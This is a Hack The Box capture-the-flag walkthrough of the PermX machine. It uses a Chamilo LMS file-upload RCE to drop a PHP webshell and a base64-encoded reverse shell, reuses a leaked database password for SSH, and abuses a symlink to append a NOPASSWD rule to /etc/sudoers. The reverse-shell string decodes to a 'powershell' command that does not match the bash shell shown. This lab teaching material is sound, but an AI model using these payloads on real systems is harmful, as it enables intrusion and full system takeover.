---
title: "PermX Walkthrough - HTB Easy | Chamilo LMS RCE & Symlink Privilege Escalation"
description: "Complete walkthrough of PermX from Hack The Box. Covers exploiting Chamilo Learning Management System via unrestricted file upload vulnerability (CVE-2023-4220), credential extraction from configuration files, password reuse for SSH access, and exploiting sudo misconfiguration through symlink manipulation to gain root access."
author: dua2z3rr
date: 2025-11-01 1:00:00
categories: ["HackTheBox", "Machines"]
tags: ["web-application", "common-applications", "arbitrary-file-upload", "php", "bash", "apache", "ssh", "reconnaissance", "fuzzing", "sudo-exploitation"]
image: /assets/img/permX/permX-resized.png
---

## Overview

`PermX` is an Easy Difficulty Linux machine featuring a learning management system vulnerable to unrestricted file uploads via [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220). This vulnerability is leveraged to gain a foothold on the machine. Enumerating the machine reveals credentials that lead to SSH access. A `sudo` misconfiguration is then exploited to gain a `root` shell.

---

## External Enumeration

### Nmap

Let's start with nmap:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.23 -vv -p-
<SNIP>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

<SNIP>

┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.23 -vv -p22,80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**
- Port 22: **SSH** (OpenSSH 8.9p1)
- Port 80: **HTTP** running **Apache httpd 2.4.52**
- Domain: **permx.htb**

---

## Web Application Analysis

### HTTP Service

Visiting the website:

![PermX homepage](/assets/img/permX/permX-1.png)

Exploring the site reveals no interesting pages or redirects.

### Directory Fuzzing

Fuzzing for directories:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt:FUZZ -u http://permx.htb/FUZZ -ic -recursion

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 47ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 47ms]
lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 47ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 48ms]
img                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 2108ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 43ms]
```

Nothing interesting found. Let's try subdomain fuzzing.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://FUZZ.permx.htb -ic
```

No results. Let's try virtual host fuzzing.

### Virtual Host Discovery

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://permx.htb -H 'Host: FUZZ.permx.htb' -ic -mc all -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /home/dua2z3rr/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 129ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1379ms]
```

**Virtual host discovered:** `lms.permx.htb`

Adding `lms.permx.htb` to `/etc/hosts` and visiting it.

---

## Chamilo LMS Analysis

### LMS Virtual Host

![Chamilo login page](/assets/img/permX/permX-2.png)

We're facing a **Chamilo** login page.

> Chamilo is a free software e-learning and content management system, aimed at improving access to education and knowledge globally. Written in **PHP**.

After trying default credentials, let's search for authentication bypass exploits.

---

## Exploit Research

### Finding CVE-2023-4220

Searching online for "Chamilo 1 auth vuln" reveals **CVE-2023-4220**.

![CVE-2023-4220 details](/assets/img/permX/permX-3.png)

**Vulnerability:** Unauthenticated Remote Code Execution

---

## Initial Access

### Exploit Script

Modified exploit to obtain a reverse shell:

```bash
#!/bin/bash
HOST='http://lms.permx.htb'
CMD='echo "cG93ZXJzaGVsbCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzkwMDEgMD4mMQ==" | base64 -d | bash'

URL_UPLD='main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
URL_FILE='main/inc/lib/javascript/bigupload/files/rce.php'

cat <<'EOF'>/tmp/rce.php
<?php
$a=popen(base64_decode($_REQUEST["aoOoy"]),'r');while($b=fgets($a,2048)){echo $b;ob_flush();flush();}pclose($a);
?>
EOF

curl -F 'bigUploadFile=@/tmp/rce.php' "$HOST/$URL_UPLD"
CMD=$(echo $CMD|base64 -w0| python3 -c "import urllib.parse,sys; print(urllib.parse.quote_plus(sys.stdin.read()))")
curl "$HOST/$URL_FILE?aoOoy=$CMD"
```

### Running the Exploit

Starting listener first:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
```

Executing the exploit:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $bash chamilo-exploit.sh
```

**Reverse shell obtained:**

```shell
Connection received on 10.10.11.23 55900
bash: cannot set terminal process group (1176): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
```

---

## Lateral Movement

### Credential Hunting

Using `find` to search for configuration files:

```shell
www-data@permx:/var/www/chamilo$ find /var/www/chamilo -iname "*config*" -type f 2>/dev/null
/var/www/chamilo/web.config
/var/www/chamilo/main/auth/shibboleth/config-dist.php
/var/www/chamilo/main/auth/shibboleth/lib/shibboleth_config.class.php
<SNIP>
/var/www/chamilo/cli-config.php
```

### Database Credentials

Found credentials in `/var/www/chamilo/app/config/configuration.php`:

```php
www-data@permx:/var/www/chamilo/app/config$ cat configuration.php | grep db -n
17:$_configuration['db_host'] = 'localhost';
18:$_configuration['db_port'] = '3306';
20:$_configuration['db_user'] = 'chamilo';
21:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

**Credentials found:**
- Database user: `chamilo`
- Database password: `03F6lY3uXAP2bkW8`

### User Enumeration

Checking users on the system:

```shell
www-data@permx:/home$ ls -al
total 12
drwxr-xr-x  3 root root 4096 Jan 20  2024 .
drwxr-xr-x 18 root root 4096 Jul  1  2024 ..
drwxr-x---  4 mtz  mtz  4096 Jun  6  2024 mtz
```

**User discovered:** `mtz`

### SSH Access

Attempting to access `mtz` account with the database password:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh mtz@permx.htb
mtz@permx.htb's password: 03F6lY3uXAP2bkW8
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 System information as of Sat Nov  1 10:19:13 AM UTC 2025

  System load:  0.08              Processes:             239
  Usage of /:   59.4% of 7.19GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for eth0: 10.10.11.23
  Swap usage:   0%

Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
mtz@permx:~$
```

**User flag obtained.**

---

## Privilege Escalation

### Sudo Enumeration

Checking sudo permissions:

```shell
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh

mtz@permx:~$ cd /opt ; ls -al | grep acl
-rwxr-xr-x  1 root root  419 Jun  5  2024 acl.sh
```

**Key finding:** Can execute `/opt/acl.sh` as sudo without password, but cannot modify it.

### Script Analysis

Examining the vulnerable script:

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

**Vulnerability identified:**
- Script uses `setfacl` to modify file permissions
- Path validation checks for `/home/mtz/*` but doesn't use `-P` flag
- No check against symbolic links
- We can create a symlink to `/etc/sudoers` and modify it

---

## Root Access via Symlink Exploitation

### Creating Symbolic Link

```shell
mtz@permx:~$ ln -s /etc/sudoers root
mtz@permx:~$ ls -al
total 52
drwxr-x---  5 mtz  mtz  4096 Nov  1 13:12 .
drwxr-xr-x  3 root root 4096 Jan 20  2024 ..
lrwxrwxrwx  1 root root    9 Jan 20  2024 .bash_history -> /dev/null
-rw-r--r--  1 mtz  mtz   220 Jan  6  2022 .bash_logout
-rw-r--r--  1 mtz  mtz  3771 Jan  6  2022 .bashrc
drwx------  2 mtz  mtz  4096 May 31  2024 .cache
drwxrwxr-x  3 mtz  mtz  4096 Nov  1 12:49 .local
lrwxrwxrwx  1 root root    9 Jan 20  2024 .mysql_history -> /dev/null
-rw-r--r--  1 mtz  mtz   807 Jan  6  2022 .profile
drwx------  2 mtz  mtz  4096 Jan 20  2024 .ssh
-rw-rwxr--+ 1 mtz  mtz    84 Nov  1 12:43 ciao.sh
-rw-rwxr--+ 1 mtz  mtz    84 Nov  1 12:50 ciao2.sh
-rw-rwxr--+ 1 mtz  mtz    84 Nov  1 12:51 ciao3.sh
-rw-rw-r--  1 mtz  mtz    85 Nov  1 12:54 ciao4.sh
-rw-rw-r--  1 mtz  mtz     0 Nov  1 13:04 hey
lrwxrwxrwx  1 mtz  mtz    12 Nov  1 13:12 root -> /etc/sudoers
-rw-r-----  1 root mtz    33 Nov  1 08:51 user.txt
```

### Exploiting Script

```shell
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root
mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
mtz@permx:~$ sudo bash
root@permx:/home/mtz# whoami
root
```

**Root flag obtained.** Box completed.

---

## Reflections

### What Surprised Me

The symlink bypass was unexpected. The script checked if the path started with `/home/mtz/` and blocked `..` traversal, but forgot that symlinks resolve to their target when accessed. I actually never thought about being able to do this until now.

### Main Mistake

I couldn't get the symlink to work. In fact, you can see the various files i created in the user directory while attempting the exploit.

### Alternative Approaches

For the privilege escalation I could have done:
1. Instead of symlink to `/etc/sudoers`, could have linked to SSH authorized_keys
2. Could have linked to `/etc/shadow` and added a known password hash
3. Might have found other writable SUID binaries or capabilities

---

**Completed this box? What was your privilege escalation method?** Leave a comment down below!
